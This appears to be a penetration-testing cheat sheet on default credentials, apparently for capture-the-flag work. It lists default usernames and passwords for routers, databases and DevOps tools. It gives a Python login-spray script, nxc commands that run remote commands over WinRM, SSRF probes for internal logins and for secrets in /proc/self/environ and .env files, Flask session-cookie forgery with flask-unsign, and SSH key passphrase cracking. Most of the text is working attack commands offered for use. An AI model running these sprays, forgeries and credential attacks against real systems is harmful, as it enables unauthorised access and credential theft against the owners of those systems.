# Default Credentials Testing

## Strategy

Try defaults BEFORE complex attacks. Priority:
1. Source-code embedded credentials (HTML comments, JS, configs).
2. Identify device/app from login branding, headers, title.
3. Top defaults for identified type against ALL endpoints.
4. SSRF / smuggling combo if login is internal-only.
5. Automated spray only after manual top-10 fails.

## Identify the target

```bash
curl -s http://target/ | grep -i '<title>'
curl -sI http://target/ | grep -i 'server\|x-powered-by\|x-generator'
curl -s http://target/login | grep -iE 'admin|router|model|firmware|version|product'
for p in /robots.txt /info /version /status /about; do curl -s "http://target$p" | head -3; done
```

## Defaults by category

**Generic / Web Admin:**
```
admin:admin    admin:password    admin:(blank)   admin:1234
admin:admin123 admin:changeme    root:root       root:(blank)
administrator:admin   guest:guest    test:test    admin:secret
```

**Network / Routers / Firewalls:**
```
admin:admin   admin:(blank)   admin:password   admin:1234
root:root     root:(blank)    cisco:cisco      ubnt:ubnt
netscreen:netscreen  pi:raspberry  admin:0000  Admin:Admin
```

**Windows (RDP/SMB/WinRM):**
```
Administrator:(blank)  Administrator:admin  Administrator:password
Administrator:Password1  admin:admin  admin:(blank)
```

Headless testing:
```bash
nxc smb TARGET -u Administrator -p ''
nxc winrm TARGET -u Administrator -p ''
# Try both cmd (-x) and PowerShell (-X); when pywinrm/evil-winrm fail, nxc -X often works
nxc winrm TARGET -u USER -p PASS -X 'type C:\Users\USER\Desktop\flag.txt'
```

**IoT / Industrial:**
```
admin:admin  root:root  root:(blank)  admin:(blank)
supervisor:supervisor  admin:system  admin:default  operator:operator
```

**Databases:**
```
MySQL:       root:(blank)  root:root  root:mysql
PostgreSQL:  postgres:postgres  postgres:(blank)
MSSQL:       sa:(blank)  sa:sa  sa:Password1
Oracle:      sys:change_on_install  system:manager  scott:tiger
MongoDB:     admin:admin  (no auth in old versions)
Redis:       (no auth by default)
```

**Web frameworks / DevOps:**
```
WordPress/Drupal/Joomla:    admin:admin  admin:password
Jenkins/Grafana/SonarQube:  admin:admin  admin:(blank)
Nexus:        admin:admin123
Tomcat:       tomcat:tomcat  tomcat:s3cret  manager:manager
GitLab:       root:5iveL!fe
RabbitMQ:     guest:guest
Portainer:    admin:admin  admin:portainer
Elasticsearch / Kibana: elastic:changeme
```

**File managers**: Tiny File Manager (`/tinyfilemanager.php`, `/tiny/tinyfilemanager.php`, `/files/tinyfilemanager.php`) `admin:admin@123` (baked into `$auth_users`); CVE-2021-45010, CVE-2024-21632. `uploads/` executes `.php` even after rename. elFinder demos / Pydio: `admin:admin`. PHPMyAdmin: try MySQL `root:(blank)`.

## Quick test script (web login)

```python
import requests, re, sys
TARGET, LOGIN = sys.argv[1], sys.argv[2] if len(sys.argv)>2 else "/login"
CREDS = [("admin","admin"),("admin",""),("admin","password"),("admin","1234"),
         ("admin","admin123"),("root","root"),("root",""),
         ("administrator","admin"),("admin","changeme"),("admin","secret"),
         ("guest","guest"),("test","test")]
FAIL = ["invalid","incorrect","failed","error","wrong","unauthorized"]
WIN  = ["logout","dashboard","welcome","signed in","my account","profile"]

s = requests.Session()
r = s.get(f"{TARGET}{LOGIN}", timeout=10, verify=False)
csrf = next(((f, re.search(rf'name="{f}"[^>]*value="([^"]+)"', r.text, re.I).group(1))
             for f in ['csrf_token','_token','authenticity_token']
             if re.search(rf'name="{f}"', r.text, re.I)), None)

for u, p in CREDS:
    data = {"username":u,"password":p}
    if csrf: data[csrf[0]] = csrf[1]
    resp = s.post(f"{TARGET}{LOGIN}", data=data, timeout=10, verify=False)
    low = resp.text.lower()
    if any(w in low for w in WIN):
        print(f"[+] SUCCESS: {u}:{p}")
        break
```

## SSRF / smuggling combo

When login is internal-only:

```bash
# SSRF POST to internal login
curl "http://target/fetch?url=http://127.0.0.1:8080/login" \
  --data "username=admin&password=admin"

# Probe internal admin ports
for port in 80 8080 8443 8000 9000 9090 3000; do
  curl -s "http://target/fetch?url=http://127.0.0.1:$port/admin" | head -5
done
```

For HTTP smuggling + auth: `server-side/reference/smuggling-authenticated.md`.

## Source-code credential hints

```bash
# HTML comments
curl -s http://target/ | grep -i '<!--' | grep -iE 'pass|cred|user|auth|secret'

# JS files
curl -s http://target/ | grep -oE 'src="[^"]*\.js"' | sed 's/src="\|"//g' | \
  xargs -I{} curl -s "http://target{}" | grep -iE 'password|credentials|secret'

# Config / debug endpoints
for p in /setup /config /install /env /debug /api/config; do
  curl -s "http://target$p" | grep -iE 'pass|user|admin|secret' | head -3
done
```

## Weak / Default Secret Keys (Session Forgery)

Beyond login creds, frameworks use hardcoded secret keys for session signing. Known key → forge sessions without ever logging in.

**Flask:**
```bash
# Common: your_secret_key, secret, secret_key, changeme, dev, development,
# supersecret, key, flask-secret, my_secret_key, password, admin, default
flask-unsign --decode --cookie "<COOKIE>"
flask-unsign --unsign --cookie "<COOKIE>" --wordlist wordlist.txt
flask-unsign --sign --cookie '{"username":"admin","user_id":1}' --secret "FOUND_KEY"
```

**Django** — `SECRET_KEY` in settings.py; common dev: `django-insecure-...`. Forge via `django.core.signing`.

**Express.js** — common: `secret`, `keyboard cat`, `your-secret`, `changeme`. Check `process.env.SESSION_SECRET`.

**Rails** — `secret_key_base` in `config/secrets.yml` or `credentials.yml.enc`.

### Flask key sources (priority)

1. SSRF → `file:///proc/self/environ`, `file:///app/.env`.
2. Path traversal → `config.py`, `settings.py`, `.env`.
3. Werkzeug debugger console (`debug=True`) — compute the PIN from file-read inputs for direct RCE: [lfi-to-rce.md](../../server-side/reference/scenarios/path-traversal/lfi-to-rce.md).
4. `.git/` exposure → checkout configs.

Forge admin session:
```bash
flask-unsign --sign --cookie '{"user_id":1,"logged_in":true,"is_admin":true}' --secret 'LEAKED_KEY'
```

Common fields: `user_id`, `username`, `logged_in`, `is_admin`, `_fresh`, `_user_id` (Flask-Login), `role`.

## SSH key passphrase cracking

When SSH private keys are recovered (file read, backup, S3), often passphrase-protected. Use bleeding-jumbo `ssh2john` — stable John 1.9.0 cannot handle ed25519 bcrypt keys.

```bash
curl -sL "https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py" -o /tmp/ssh2john.py
python3 /tmp/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash
```

Low bcrypt KDF rounds (16-32) crack in minutes; 100+ needs targeted wordlists.

## Service credential reuse

Exploiting chat bots / automation services? Check config for creds reused by the human operator.

Locations: `.env`, `config.yml`, systemd unit env, cron scripts, DB connection strings. Test discovered passwords for SSH, sudo, web admin as the configuring user.

## References

- CWE-1392: Use of Default Credentials.
- CWE-521: Weak Password Requirements.
- MITRE ATT&CK T1078.001 (Default Accounts).
- OWASP A07:2021.
